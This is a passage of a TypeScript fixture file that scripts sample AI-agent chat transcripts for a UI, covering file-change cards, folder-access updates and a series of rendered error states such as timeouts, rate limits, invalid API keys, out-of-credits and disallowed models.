      prose("I updated the hero section and removed the legacy stylesheet."),
      notes(
        {
          // Root-level paths: the grid only surfaces the task's own folders and
          // the files beside them, so a nested path renders nothing.
          data: {
            files: [
              changedFile({
                filePath: "hero.tsx",
                size: 3200,
                status: "modified",
              }),
              changedFile({
                filePath: "styles.css",
                mimeType: "text/css",
                size: 1800,
                status: "added",
              }),
              changedFile({
                filePath: "legacy.css",
                mimeType: "text/css",
                size: 0,
                status: "deleted",
              }),
            ],
          },
          type: "data-fileChanges",
        },
        {
          // Real skill names, so the card resolves a title and description here
          // the way it does in a session; an unknown one falls back to the name.
          data: { created: ["wireframe"], updated: ["markdown"] },
          type: "data-skillChanges",
        },
      ),
      user(
        "Great, keep going and check it in the browser.",
        {
          data: {
            status: "open",
            target: { title: "Landing preview", url: "https://example.com" },
          },
          type: "data-browserStatus",
        },
        {
          data: {
            accessChanged: [
              { access: "read-only", name: "Photos", path: "/tmp/Photos" },
            ],
            removed: [{ name: "designs", path: "/tmp/designs" }],
            renamed: [
              {
                newName: "CloudDocs-Downloads",
                oldName: "Downloads",
                path: "/tmp/CloudDocs/Downloads",
              },
            ],
          },
          type: "data-attachedFolderChanges",
        },
      ),
      prose(
        "Reopened the preview and re-read the externally changed tokens. Continuing the redesign.",
      ),
    ],
  },
  {
    about:
      "Turns that ended in an error rather than an answer. Only the last one is opened and offered a way forward; the ones above it stay collapsed, which is what a transcript of a bad afternoon looks like.",
    id: "errors",
    name: "Errors, one after another",
    script: [
      user("Help me write a function to parse JSON."),
      sameStep(
        prose("I'll help you create a JSON"),
        fail({
          kind: "api-call",
          message: "Connection timeout",
          name: "TimeoutError",
          statusCode: 504,
          url: "https://api.example.com/v1/messages",
        }),
      ),
      user("Try again please."),
      fail({
        kind: "unknown",
        message: "Unexpected error during model inference",
      }),
      user("One more time."),
      fail({
        kind: "api-key",
        message:
          "Invalid API key provided. Please check your API key configuration.",
      }),
      user("And again."),
      sameStep(
        prose("Sure. Let me start by"),
        fail({
          kind: "api-call",
          message: "Rate limit exceeded. Please try again later.",
          name: "RateLimitError",
          statusCode: 429,
          url: "https://api.example.com/v1/messages",
        }),
      ),
    ],
  },
  {
    about:
      "The account is out of credits, which is our own gateway talking rather than a provider. The card that draws is not the generic error one: it is the offer to top up, and it only appears for the turn that just failed.",
    id: "out-of-credits",
    name: "Out of credits",
    script: [
      user("Can you help me analyze this code?"),
      fail(
        platformFailure({
          code: "insufficient-credits",
          message:
            "Your account has insufficient credits to complete this request.",
          name: "InsufficientCreditsError",
          statusCode: 402,
        }),
        OUR_MODEL,
      ),
    ],
  },
  {
    about:
      "The model the task is pinned to is one the account cannot use. Model not allowed, not found, and never named at all all land here, and the way out of every one of them is the same: switch to Auto.",
    id: "model-unavailable",
    name: "Model unavailable",
    script: [
      user("Can you help me with this?"),
      fail(
        platformFailure({
          code: "model-not-allowed",
          message: "The requested model is not allowed for your account.",
          name: "ModelNotAllowedError",
          statusCode: 403,
        }),
        OUR_MODEL,
      ),
    ],
  },
  {
    about:
      "Errors the reader is deliberately not shown: one the user caused by stopping the agent, and one that has since been answered by a later turn. Both are still in the transcript, and developer mode is what brings them back.",
    id: "hidden-errors",
    name: "Errors that stay hidden",
    script: [
      user("Can you help me analyze this code?"),
      fail(
        platformFailure({
          code: "insufficient-credits",
          message:
            "Your account has insufficient credits to complete this request.",
          name: "InsufficientCreditsError",
          statusCode: 402,
        }),
        OUR_MODEL,
      ),
      user("Let me try that again with my updated account."),
      sameStep(
        prose("I can help with that. Let me start by reading the"),
        fail({ kind: "aborted", message: "Request was aborted by the user" }),
      ),
      user("Please continue with the analysis."),
      sameStep(
        prose("Sure, I'll pick up where we left off"),
        fail({
          kind: "api-call",
          message: "Connection timeout",
          name: "TimeoutError",
          statusCode: 504,
          url: "https://api.example.com/v1/messages",
        }),
      ),
    ],
  },
];
